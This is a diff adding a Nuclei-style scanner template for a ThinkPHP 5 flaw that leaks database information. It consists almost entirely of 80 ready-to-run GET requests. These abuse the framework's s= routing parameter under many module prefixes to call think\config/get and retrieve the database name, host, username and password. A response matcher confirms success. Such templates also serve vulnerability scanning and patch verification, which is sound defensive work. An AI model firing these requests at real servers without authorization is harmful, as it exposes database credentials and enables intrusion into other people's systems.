@@ -1,0 +1,101 @@
+id: thinkphp5-database-leak
+
+info:
+  name: ThinkPHP 5 数据库信息泄露
+  author: ikun
+  severity: critical
+  description: ThinkPHP 5 数据库信息泄露
+  tags: thinkphp
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?s=/0/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/0/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/0/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/0/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/%20/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/%20/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/%20/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/%20/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/%5c/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/%5c/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/%5c/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/%5c/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/about/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/about/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/about/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/about/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/admin/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/admin/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/admin/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/admin/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/api/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/api/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/api/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/api/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/calculation/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/calculation/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/calculation/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/calculation/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/captcha/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/captcha/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/captcha/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/captcha/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/chat/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/chat/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/chat/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/chat/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/circle/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/circle/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/circle/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/circle/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/common/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/common/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/common/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/common/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/company/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/company/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/company/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/company/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/data/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/data/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/data/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/data/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/download/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/download/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/download/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/download/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/extra/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/extra/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/extra/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/extra/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/front/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/front/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/front/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/front/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/home/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/home/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/home/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/home/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/notify/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/notify/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/notify/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/notify/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/sso/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/sso/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/sso/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/sso/think\\config/get&name=database.username"
+      - "{{BaseURL}}?s=/upload/think\\config/get&name=database.database"
+      - "{{BaseURL}}?s=/upload/think\\config/get&name=database.hostname"
+      - "{{BaseURL}}?s=/upload/think\\config/get&name=database.password"
+      - "{{BaseURL}}?s=/upload/think\\config/get&name=database.username"
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(body)>=2 && len(body)<=20 && status_code!=404'
+          - '!contains(body, "\"")'
+        condition: and
